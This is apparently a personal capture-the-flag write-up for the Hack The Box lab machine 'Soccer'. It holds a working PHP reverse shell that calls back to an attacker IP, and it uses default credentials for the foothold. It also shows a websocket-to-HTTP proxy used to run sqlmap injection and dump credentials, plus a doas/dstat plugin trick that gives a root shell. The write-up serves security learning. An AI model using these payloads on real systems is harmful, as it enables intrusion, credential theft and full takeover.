---
created: 2025-08-21
---

📅 `2025-08-21`

#default-credentials #file-upload #websocket #sql-injection #gtfobins #sudo

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Soccer`  |
| --------------- | --- |
| 📆 Release Date |   `2022-12-17`  |
| 🌐 IP Address   |   `10.10.11.194`  |
| 🖥️ OS           |   `Linux`  |
| 🎯 Difficulty   |   `Easy`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Directory fuzzing
- File upload
- Hunting for subdomains in the web server's config files
- `Websockets`
- `SQL` injection
- `sudo`

**🛠️ Tools:**  

- `ffuf`
- `Caido`
- `sqlmap`
- `wscat`

**📚 Learned:**  

- `Websockets` tested for `SQL` injection. We can automate this process with `sqlmap` and a proxy.
- Don't overlook websites that may look similar.

----

## 🌐 Port Scan

- **TCP**: 22, 80, 9091

---

## 🔍 Enumeration

Port 80 redirects to `http://soccer.htb`. After adding it to `/etc/hosts`, we can see a soccer fan site. There is no functionality in this page, so I started fuzzing.

![[Pasted image 20250821153647.png]]

```shell
ffuf -u 'http://soccer.htb/FUZZ' -w $DIRS -e .php
```

The fuzzing attack found `/tiny`. That path hosts a "Tiny File Manager" login prompt.

![[Pasted image 20250821153838.png]]

Googling for the default credentials I found `admin`:`admin@123`. I tested those and logged in as `admin`.

![[Pasted image 20250821153936.png]]

Looks like we can upload files, and since the server is running `nginx`, it likely interprets `PHP`.

---

## 🪜 Foothold

I created a file called `rev.php` with a reverse shell payload from `revshell php 1234`. This is the file:

```php
<?php $s = stream_socket_client("tcp://10.10.14.7:1234"); proc_open("/bin/sh -i", [0=>$s,1=>$s,2=>$s],$pipes);?>
```

I moved to the `tiny/uploads` directory and uploaded the file there, since the permissions on that directory were `0755`. To do this, click Upload and select `rev.php`.

![[Pasted image 20250821154033.png]]

Now start a listener, navigate to that path, and catch the reverse shell.

```shell
listen linux 1234
```

```shell
curl http://soccer.htb/tiny/uploads/rev.php
```

And we got a shell as `www-data`.

```shell
www-data@soccer:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 👤 User

The machine had only user `player`. I confirmed this by reading `/etc/passwd`.

```shell
www-data@soccer:~$ ls /home
player

www-data@soccer:~$ cat /etc/passwd
<SNIP>
```

After a lot of enumeration, I found this in `nginx`'s config files:

```shell
www-data@soccer:~$ ls /etc/nginx/sites-enabled/
default  soc-player.htb

www-data@soccer:~$ cat /etc/nginx/sites-enabled/soc-player.htb 
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}
```

This revealed the subdomain `soc-player.soccer.htb`. I added it to `/etc/hosts` and found this:

![[Pasted image 20250821154453.png]]

It's almost the same site, but this one has accounts. I created an account.

![[Pasted image 20250821154758.png]]

After logging in I got redirected to `/check`.

![[Pasted image 20250821154840.png]]

![[Pasted image 20250821154852.png]]

It looks like it processes the user input and returns an answer. I couldn't see any communication in the `HTTP` history on `Caido`, so I inspected the source code suspecting `JavaScript`.

And it was `JavaScript`. The script starts a connection to a `websocket` listening on port `9091`, which was the unknown port from the port scan.

![[Pasted image 20250821154956.png]]

I looked for the format of the request in `Caido`'s `websocket` history:

![[Pasted image 20250821155901.png]]

It was a `JSON` payload with a single parameter `"id"`.

I tried some payloads for `SQL` injection and command injection using `wscat`, but I had no success. `sqlmap` can't target a `websocket` directly, so I used this `Python` `HTTP` proxy that forwards the parameters sent to its `HTTP` server to the `websocket`. Everything we send to the parameter `id` gets correctly sent to the `websocket`:

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse

from websocket import create_connection

ws_server = "ws://soccer.htb:9091"


def send_ws(payload):
    ws = create_connection(ws_server)
    # If the server returns a response on connect, use below line
    # resp = ws.recv() # If server returns something like a token on connect you can find and extract from here

    # For our case, format the payload in JSON
    message = unquote(payload).replace(
        '"', "'"
    )  # replacing " with ' to avoid breaking JSON structure
    data = '{"id":"%s"}' % message

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ""


def middleware_server(host_port, content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split("=", 1)[1]
            except IndexError:
                payload = False

            if payload:
                content = send_ws(payload)
            else:
                content = "No parameters specified!"

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
    middleware_server(("0.0.0.0", 8081))
except KeyboardInterrupt:
    pass
```

Now we can send parameters to `http://localhost:8081/?id=1` and it will redirect them to the `websocket`.

`sqlmap` found that the `websocket` was vulnerable to blind `SQL` injection.

```shell
sqlmap -u 'http://localhost:8081/?id=1' --batch
```

`sqlmap` showed we were in database `soccer_db`, and it only had one table, `accounts`. I dumped the table with this command:

```shell
sqlmap -u 'http://localhost:8081/?id=1' --batch --dump -T accounts -D soccer_db

[15:53:47] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[15:53:47] [INFO] fetching columns for table 'accounts' in database 'soccer_db'
[15:53:47] [INFO] resumed: 4
[15:53:47] [INFO] resumed: email
[15:53:47] [INFO] resumed: id
[15:53:47] [INFO] resumed: password
[15:53:47] [INFO] resumed: username
[15:53:47] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[15:53:47] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[15:53:47] [INFO] resumed: 1
[15:53:47] [INFO] resumed: player@player.htb
[15:53:47] [INFO] resumed: 1324
[15:53:47] [INFO] resumed: PlayerOftheMatch2022
[15:53:47] [INFO] resuming partial value: player
```

This revealed a password. It worked with `su - player` from our reverse shell, and over `SSH` too. Got user flag.

- `player`:`PlayerOftheMatch2022`

---

## 🛡️ Privilege Escalation

While looking for `SUID` binaries, I found `doas` installed.

```shell
player@soccer:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
```

And its configuration file:

```shell
player@soccer:~$ find / -name 'doas.conf' 2>/dev/null
/usr/local/etc/doas.conf

player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

We can execute `/usr/bin/dstat` as root.

We can escalate privileges leveraging `sudo` permissions for `dstat`. Here is the procedure from [`GTFObins`](https://gtfobins.github.io):

![[Pasted image 20250821160359.png]]

Since `doas` does the same thing as `sudo`, we can just adapt the payload.

```shell
player@soccer:/tmp$ echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
player@soccer:/tmp$ doas /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted.
